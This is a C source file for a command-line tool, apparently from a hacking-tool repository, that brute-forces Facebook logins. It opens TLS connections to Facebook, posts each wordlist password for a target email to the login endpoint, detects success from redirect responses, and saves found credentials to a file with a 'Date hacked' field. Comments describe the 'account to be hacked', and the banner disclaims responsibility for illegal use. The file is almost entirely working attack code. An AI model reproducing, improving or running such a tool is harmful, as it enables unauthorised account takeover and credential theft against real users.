/* fblookup.c */

#include "fblookup.h"


SOCKET connect_socket;
#define MAXINPUT 120


void ErrorExit() {

    #if defined(_WIN32)
    WSACleanup();
    #endif
    exit(1);

}




void menu() {

    #if defined(_WIN32)
    system("cls");
    #else
    system("clear");
    #endif
    
    printf("%s", green);
    printf("\t    XXXXXX XXXXXX XX      XXXXX   XXXXX  XX  XX XX  XX XXXXXX  \n");
    printf("\t   XX     XX  XX XX     XX   XX XX   XX XX XX  XX  XX XX  XX   \n");
    printf("\t  XXXXXX XXXXX  XX     XX   XX XX   XX XXXX   XX  XX XXXXXX    \n");
    printf("\t XX     XX  XX XX     XX   XX XX   XX XX XX  XX  XX XX         \n");
    printf("\tXX     XXXXXX XXXXXX  XXXXX   XXXXX  XX  XX XXXXXX XX          \n");
    printf("\t     \n");
    printf("\t[ + ]   Coded by: Anonymous Hacks                     [ + ]  \n");
    printf("\t[ + ]   GitHub: https://www.github.com/4anonz         [ + ]v1\n");
    printf("%s", blue);
    printf("\t[ + ]Note!: We won't accept any responsibility for any illegal use[ + ]\n\n");
    printf("%s", reset);

}


void prompt_user(const char *prompt, char *buffer) {
    printf("%s", prompt);
    buffer[0] = 0;

    fgets(buffer, MAXINPUT, stdin);
    const int size = strlen(buffer);
    
    if (buffer > 0)
        buffer[size - 1] = 0;
    
}



/* For Establishing A TLS connection to the facebook server*/
SSL *connect_server() {

    /**
     * The SSL_CTX_new, is use ot hold the initial setting we want to use for our
     * SSL/TLS connection
    */
    SSL_CTX *context = SSL_CTX_new(TLS_client_method());

    if(!context) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf("SSL_CTX_new() failed");
        exit(1);
    }
    struct addrinfo hints;

    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo *server_addr;
    if(getaddrinfo("www.facebook.com", "443", &hints, &server_addr)) {

        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" getaddrinfo code:%d : (%s)\n", GetErrorNo(), strerror(GetErrorNo()));
        ErrorExit();
    }

    //Create a socket
    connect_socket = socket(server_addr->ai_family, server_addr->ai_socktype,
                                                    server_addr->ai_protocol);
    if(!IsValidSocket(connect_socket)) {

        printf("%s", red);printf("[Error]:");printf("%s", reset);
        printf(" socket code:%d: (%s)\n", GetErrorNo(), strerror(GetErrorNo()));
        ErrorExit();
    }
    //Connect the prevois created socket to the server
    if(connect(connect_socket, server_addr->ai_addr, server_addr->ai_addrlen)) {

        printf("%s", red); printf("[Error]:");printf("%s", reset);
        printf("connect code:%d: (%s)\n", GetErrorNo(), strerror(GetErrorNo()));
        CloseSocket(connect_socket);
        ErrorExit();
    }
    //Once a TCP conection is established, then the next thing is
    // to initiate a TLS connection to the server
    
    SSL *ssl = SSL_new(context);
    if(!ssl) {
        printf("%s", red); printf("[Error]:");printf("%s", reset);
        printf("SSL_new() failed\n");
        ErrorExit();
    }
    /*Allow OpneSSL to use SNI */
    if(!SSL_set_tlsext_host_name(ssl, "www.facebook.com")) {

        printf("%s", red); printf("[Error]:");printf("%s", reset);
        printf("SSL_set_tlsext_host_name() failed");
        ERR_print_errors_fp(stdout);
        ErrorExit();
    }
    /*set our coonect_socket for I/O and start our SSL/TLS connection*/
    SSL_set_fd(ssl, connect_socket);
    if(SSL_connect(ssl) == -1) {

        printf("%s", red); printf("[Error]:");printf("%s", reset);
        printf("SSL_connect() failed");
        ERR_print_errors_fp(stdout);
        printf("\n");
        ErrorExit();
    }

    freeaddrinfo(server_addr);
    return ssl;
}


/**
 * encode_password is used to encode every password(if required)
 * to a url encoding
*/
char *encode_password(char *text) {
    
    char *encoded = (char *) malloc(sizeof(char)*strlen(text)*3+1);
    const char *hex = "0123456789ABCDEF";
    int pos = 0;

    for(int i = 0; i < strlen(text); i++) {
        if (('a' <= text[i] && text[i] <= 'z')
        || ('A' <= text[i] && text[i]<= 'Z')
        || ('0' <= text[i] && text[i] <='9')) {
            encoded[pos++] = text[i];
        } else {
            encoded[pos++] = '%';
            encoded[pos++] = hex[text[i] >> 4];
            encoded[pos++] = hex[text[i] & 15];
        }
    }

    encoded[pos] = '\0';
    return encoded;
}

/**
 * send_request_headers is used to sent HTTP headers to the facebook
 * server once connection is establish
*/
void send_request_headers(int clen, SSL *ssl) {

    char buffer[2049];
    sprintf(buffer, "POST /login.php HTTP/1.1\r\n");
    sprintf(buffer + strlen(buffer), "Host: www.facebook.com\r\n");
    sprintf(buffer + strlen(buffer), "Connection: close\r\n");
    sprintf(buffer + strlen(buffer), "Content-Length: %d\r\n", clen);
    sprintf(buffer + strlen(buffer), "Cache-Control: max-age=0\r\n");
    sprintf(buffer + strlen(buffer), "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n");
    sprintf(buffer + strlen(buffer), "Origin: https://www.facebook.com\r\n");
    sprintf(buffer + strlen(buffer), "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31\r\n");
    sprintf(buffer + strlen(buffer), "Content-Type: application/x-www-form-urlencoded\r\n");
    sprintf(buffer + strlen(buffer), "Accept-Encoding: gzip,deflate,sdch\r\n");
    sprintf(buffer + strlen(buffer), "Accept-Language: en-US,en;q=0.8\r\n");
    sprintf(buffer + strlen(buffer), "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n");
    sprintf(buffer + strlen(buffer), "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa\r\n");
    sprintf(buffer + strlen(buffer), "\r\n");

    SSL_write(ssl, buffer, strlen(buffer));
}

/**
 * the login() is the most important function as it takes the username
 * of the account to be hacked and a wordlist to try every password
 * against the username.....
 * this is where the actual connection is made, and data transfer on the
 * network
*/
void login(char *wlist, char *user) {

    FILE *wordlist;
    wordlist = fopen(wlist, "r");
    char password[100], post[1024], read[4024];
    int bytes_received;
    char *encoded_pass;
    int success = 0;
    printf("\n");
    while(fgets(password, sizeof(password), wordlist)) {

        //Remove last trailling newline
        strtok(password, "\n");
    
        /**
         * encoding the password to a url encode in case if the password
         * contains some special characters such as !@#%^&*()_
         * */

        encoded_pass = encode_password(password);

        // This is the actual body of the request which contains the password and username
        sprintf(post, "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=%s&pass=%s&default_persistent=0&login=Log+In\r\n", user, password);
        int postlen = strlen(post);


        // Establish a SSL/TLS connection to facebook server
        SSL *ssl = connect_server();
        printf("%s", cyan); printf("[Info]: "); printf("%s", reset);
        printf("Tying login =====> %s", password);

        //Send the HTTP request headers
        send_request_headers(postlen, ssl);
        SSL_write(ssl, post, strlen(post));

        //Receive a reply
        bytes_received = SSL_read(ssl, read, 4024);
        /**
         * Because in the HTTP POST request header, the connection is set to
         * 'Connection: close' after each request, we need to close and
         * shutdown the connection
        */

        SSL_shutdown(ssl);
        CloseSocket(connect_socket);
        SSL_free(ssl);

        /**
         * We check the response header received and check wether our
         * login was successful or not. mostly if the login was success
         * you'll get a status code of 302 (Found).
         * If you get another differ status code with a redirection, then 
         * it also means the login was success and in the response header
         * you'll get a "Location: url" header. so we can check for both.
         * but it's completely optional, you can remove the 302.
        */

        if(strstr(read, "302") || strstr(read, "Location: ")) success = 1;
        if(success) {
            printf("%s", yellow);
            printf("\n");
            printf("\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
            printf("                                                    \n");
            printf("\t     Password Found[!] ==> %s ^.^                 \n", password);
            printf("                                                    \n");
            printf("\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
            printf("%s", reset);
            break;
        } else {
            printf("%s", red);
            printf("\t\t[failed]\n");
            printf("%s", reset);
        }
    }

    if(success) {
        FILE *cred;
        time_t timer = time(&timer);
        cred = fopen("credentials.txt", "a");
        fprintf(cred, "$$$$$$$$$$$$$$$$| Login Credential |$$$$$$$$$$$$$$$$\n\n");
        fprintf(cred, "|--Date hacked: %s\n", ctime(&timer));
        fprintf(cred, "|--Email      : %s\n", user);
        fprintf(cred, "|--Password   : %s\n", password);
        fclose(cred);
    }
    printf("%s", cyan);
    printf("\n[Info]:"); printf("%s", reset);
    printf(" Brute-Force Complete!"); printf("%s", blue);
    printf("[ ✔ ]\n"); printf("%s", reset);
    fclose(wordlist);
    if(success) printf("Login Credentials save to 'credentials.txt'\n\n");
}

/*fblooup.c*/